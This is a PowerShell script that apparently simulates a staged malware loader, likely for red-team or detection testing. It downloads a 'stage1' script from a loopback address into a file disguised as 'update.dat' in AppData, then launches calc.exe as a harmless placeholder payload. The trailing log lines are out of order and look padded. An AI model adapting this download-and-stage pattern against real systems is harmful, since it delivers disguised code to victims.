[CmdletBinding()]
param(
    [string]$Stage1Url = 'https://127.0.0.1/stage1.ps1',
    [string]$LocalPath = "$env:APPDATA\update.dat",
    [string]$StageLog = "$env:TEMP\recon.log",
    [int]$ConnectionTimeout = 93
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 93
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

function Invoke-Stage2Execution {
    [CmdletBinding()]
    param(
        [string]$StagedPath = '',
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

Write-Verbose "Starting multi-stage workflow"
$StageResult = Invoke-Stage1Download -SourceUrl $Stage1Url -DestinationPath $LocalPath -TimeoutSec $ConnectionTimeout
if ($StageResult) {
    $HandoffResult = Invoke-Stage2Execution -StagedPath $LocalPath
    Write-Verbose ("Handoff result: " + $HandoffResult)
}
else {
    Write-Warning "First stage did not complete"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $Stage1Url
    Destination = $LocalPath
    TimeoutSec = $ConnectionTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Operation completed"
Write-Verbose "Validating result"
Write-Verbose "Applying operation timeout"
Write-Verbose "Checking local path"
Write-Verbose "Inspecting process list"
Write-Verbose "Starting workflow"
Write-Verbose "Preparing working directory"
Write-Verbose "Cleaning temporary marker"
$StageMarker = "stage-13"
Start-Sleep -Seconds 31
